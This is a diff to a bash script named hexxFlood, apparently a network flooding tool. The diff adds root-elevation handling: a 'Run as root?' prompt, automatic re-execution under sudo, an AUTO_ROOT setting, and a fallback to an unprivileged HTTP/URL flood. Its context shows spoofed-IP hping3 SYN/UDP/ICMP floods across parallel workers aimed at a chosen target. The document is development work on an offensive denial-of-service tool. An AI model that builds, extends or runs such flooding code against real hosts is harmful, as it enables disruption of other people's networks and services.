@@ -33,6 +33,18 @@ SPOOF_IP=true
 RANDOM_PORTS=true
 TARGET_TYPE="ip"
 
+# Privilege state. Set by ensure_privileges(): 1 when we have root (either the
+# user ran us as root / via sudo, or accepted the elevation prompt), 0 when the
+# user chose to run unprivileged (HTTP/URL flood only).
+RUN_AS_ROOT=0
+
+# Default answer to the "Run as root?" prompt when NOT launched as root:
+#   ""        -> ask interactively (default)
+#   yes|true  -> auto-elevate via sudo without asking (still one password prompt)
+#   no|false  -> stay unprivileged without asking (HTTP/URL flood only)
+# Persist in ~/.hexxFlood_config, or override per-run with the AUTO_ROOT env var.
+AUTO_ROOT="${AUTO_ROOT:-}"   # keep any value passed in the environment
+
 # System tuning — genuine, SAFE power levers that are captured and RESTORED on
 # exit. We deliberately do NOT touch MTU (jumbo frames break non-jumbo LANs),
 # turbo, hugepages or IRQ affinity: those either hurt throughput or leave the
@@ -48,9 +60,16 @@ RUN_MONITOR_ONLY=false   # set by --monitor to run the monitor and exit
 
 declare -A SAVED_SYSCTL  # original sysctl values, restored on cleanup
 
+# Remember a non-empty AUTO_ROOT passed via the environment so a per-run
+# `AUTO_ROOT=... hexxFlood …` still wins over the value in ~/.hexxFlood_config.
+_ENV_AUTO_ROOT="${AUTO_ROOT:-}"
+
 if [ -f "$CONFIG_FILE" ]; then
     source "$CONFIG_FILE"
 fi
+
+# Environment value (if any) overrides the config file.
+[ -n "$_ENV_AUTO_ROOT" ] && AUTO_ROOT="$_ENV_AUTO_ROOT"
 
 # Resolve where this script (and monitor.sh) live, even via the wrapper/symlink
 SCRIPT_DIR="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"
@@ -112,6 +131,15 @@ show_help() {
     echo -e "${YELLOW}Note:${NC} on a Wi-Fi interface the auto worker count is capped to ~2× cores —"
     echo "      that is the real throughput peak there (more workers congestion-collapse"
     echo "      and send LESS). Wired interfaces scale up the full mode ladder."
+    echo ""
+    echo -e "${YELLOW}Root / Privileges:${NC}"
+    echo "      The raw-packet engine (hping3) and system tuning need root. If you are"
+    echo "      not root, hexxFlood asks 'Run as root? [Y/n]' at startup:"
+    echo "        Y (default) -> re-launches via sudo (one password prompt), full power"
+    echo "        n           -> runs unprivileged: HTTP/URL flood only, no tuning"
+    echo "      Launch with 'sudo hexxFlood …' to skip the prompt entirely."
+    echo "      Skip the prompt without sudo via AUTO_ROOT (env or ~/.hexxFlood_config):"
+    echo "        AUTO_ROOT=yes  -> auto-elevate    AUTO_ROOT=no -> stay unprivileged"
     echo ""
     echo -e "${YELLOW}Monitoring Options:${NC}"
     echo "  --monitor                Open the live monitor only (no attack)"
@@ -930,8 +958,80 @@ cleanup() {
     exit 0
 }
 
+# Decide whether we run with root and, if not, ask the user what to do.
+# hexxFlood's raw-packet engine (hping3 --flood) and system tuning need root;
+# only the HTTP/URL flood works unprivileged. Behaviour:
+#   * already root (or launched via sudo) -> just proceed.
+#   * monitor-only mode                    -> never needs root, proceed.
+#   * otherwise prompt: "Run as root?"
+#       - yes (default): re-exec the whole script under sudo (ONE password
+#                        prompt), so every child runs as root cleanly.
+#       - no           : keep running unprivileged. If the attack has an HTTP
+#                        path we continue with raw floods + tuning disabled;
+#                        if it is raw-packet only, there is nothing to do, so
+#                        we explain and exit instead of spamming sudo prompts.
+ensure_privileges() {
+    if [ "$EUID" -eq 0 ]; then
+        RUN_AS_ROOT=1
+        return 0
+    fi
+    RUN_AS_ROOT=0
+
+    # The live monitor reads /sys + ping only — no root required.
+    [ "$RUN_MONITOR_ONLY" = true ] && return 0
+
+    # Does the chosen attack have an unprivileged path (Python HTTP/URL flood)?
+    local has_http=0
+    if [ "$TARGET_TYPE" = "url" ] || [[ ",$ATTACK_TYPES," == *",http,"* ]]; then
+        has_http=1
+    fi
+
+    echo -e "${YELLOW}🔐 hexxFlood's raw-packet engine (hping3) and system tuning need ROOT.${NC}"
+    echo -e "${YELLOW}   You are not root right now.${NC}"
+    echo ""
+
+    local ans=""
+    # A configured/env AUTO_ROOT preference skips the interactive prompt.
+    case "${AUTO_ROOT,,}" in
+        1|y|yes|true)
+            ans="y"
+            echo -e "${CYAN}   (AUTO_ROOT=${AUTO_ROOT}: elevating automatically)${NC}" ;;
+        0|n|no|false)
+            ans="n"
+            echo -e "${CYAN}   (AUTO_ROOT=${AUTO_ROOT}: staying unprivileged)${NC}" ;;
+        *)
+            # Read the answer from the real terminal so it works even if stdin is piped.
+            read -r -p "$(echo -e "${WHITE}Run as root now? [Y/n]: ${NC}")" ans </dev/tty 2>/dev/null ;;
+    esac
+
+    case "${ans,,}" in
+        n|no)
+            if [ "$has_http" != 1 ]; then
+                echo ""
+                echo -e "${RED}❌ This attack is raw-packet only and needs root, which you declined.${NC}"
+                echo -e "${YELLOW}   Re-run and choose 'Y', or start it directly with:  sudo $0 $*${NC}"
+                exit 1
+            fi
+            echo -e "${YELLOW}⚠️  Continuing WITHOUT root: only the HTTP/URL flood will run —${NC}"
+            echo -e "${YELLOW}   raw-packet floods (hping3) and system tuning are disabled.${NC}"
+            echo ""
+            SYS_TUNE=false        # can't tune the kernel/NIC without root
+            RUN_AS_ROOT=0
+            ;;
+        *)
+            echo -e "${CYAN}🔼 Elevating with sudo (you'll be asked for your password once)…${NC}"
+            # -E keeps env (DISPLAY/HEXXFLOOD_WORKERS/…); SUDO_USER lets us drop
+            # back to the real user for git + monitor windows. Re-runs from the
+            # top, so ensure_privileges() sees EUID 0 and returns immediately.
+            exec sudo -E bash "$0" "${SCRIPT_ARGS[@]}"
+            ;;
+    esac
+}
+
 main() {
     trap cleanup SIGINT SIGTERM
+    # Remember the original CLI args so we can re-exec verbatim under sudo.
+    SCRIPT_ARGS=("$@")
     show_banner
     parse_args "$@"
 
@@ -945,6 +1045,9 @@ main() {
     fi
 
     [ -n "$MODE" ] && set_mode
+
+    # Ask about / acquire root before doing any real work (may re-exec via sudo).
+    ensure_privileges "$@"
 
     # Validate numeric inputs against documented ranges
     if ! [[ "$THREADS" =~ ^[0-9]+$ ]] || [ "$THREADS" -lt 1 ] || [ "$THREADS" -gt 200 ]; then
@@ -982,6 +1085,7 @@ main() {
     echo "  Packet Size: $PACKET_SIZE bytes"
     echo -e "  Flood Power: ${GREEN}${FLOOD_WORKERS}${NC} parallel hping3 --flood workers (${CORES} CPU cores)$([ "${WORKERS_FORCED:-0}" = 1 ] && echo " (forced)")"
     [ "${WIFI_CAPPED:-0}" = 1 ] && echo -e "  ${YELLOW}↳ wireless iface '$INTERFACE' → capped to WiFi peak (2× cores) for max real throughput.${NC} Override: HEXXFLOOD_WORKERS=N or WIFI_WORKER_CAP=N"
+    echo "  Privileges: $([ "${RUN_AS_ROOT:-0}" = 1 ] && echo "root (full raw-packet engine)" || echo "user (HTTP/URL flood only)")"
     echo "  System Tuning: $([ "$SYS_TUNE" = true ] && echo "on (restored on exit)" || echo "off")"
     echo "  Duration: ${ATTACK_DURATION:-Infinite}"
     echo ""
@@ -1011,7 +1115,12 @@ main() {
         echo ""
     fi
 
-    if echo ",$ATTACK_TYPES," | grep -qE ',(syn|udp|icmp|ack|rst|fin),'; then
+    # Raw-packet (hping3) engine needs root. Skip it cleanly when unprivileged
+    # instead of firing hundreds of per-command sudo password prompts.
+    if echo ",$ATTACK_TYPES," | grep -qE ',(syn|udp|icmp|ack|rst|fin),' && [ "${RUN_AS_ROOT:-0}" != 1 ]; then
+        echo -e "${YELLOW}⚠️  Skipping raw-packet flood (syn/udp/icmp/ack/rst/fin) — it needs root.${NC}"
+        echo ""
+    elif echo ",$ATTACK_TYPES," | grep -qE ',(syn|udp|icmp|ack|rst|fin),'; then
         echo -e "${GREEN}Starting network layer attack on $TARGET...${NC}"
         echo -e "${GREEN}⚡ ${FLOOD_WORKERS} flood workers across ${CORES} cores — full power${NC}"
         echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
